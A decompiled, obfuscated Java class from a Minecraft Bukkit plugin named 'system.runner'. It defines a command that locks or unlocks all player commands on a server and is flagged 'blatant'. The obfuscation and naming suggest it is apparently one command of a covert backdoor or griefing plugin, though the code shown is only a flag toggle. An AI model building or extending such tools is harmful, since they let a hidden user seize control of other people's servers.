/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class LockcmdsCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public LockcmdsCommand() {
        LockcmdsCommand lllllllllllllllIlIIlIllIIIllIlIl;
    }

    @Override
    public void execute(Core lllllllllllllllIlIIlIllIIIlIllIl, String lllllllllllllllIlIIlIllIIIllIIII, String[] lllllllllllllllIlIIlIllIIIlIllll, Player lllllllllllllllIlIIlIllIIIlIlllI) {
        if (lllllllllllllllIlIIlIllIIIlIllIl.playerCommandsLocked) {
            lllllllllllllllIlIIlIllIIIlIllIl.playerCommandsLocked = false;
            lllllllllllllllIlIIlIllIIIlIlllI.sendMessage(Settings.PREFIX("All commands are now unlocked"));
        } else {
            lllllllllllllllIlIIlIllIIIlIllIl.playerCommandsLocked = true;
            lllllllllllllllIlIIlIllIIIlIlllI.sendMessage(Settings.PREFIX("All commands are now locked"));
        }
    }
}

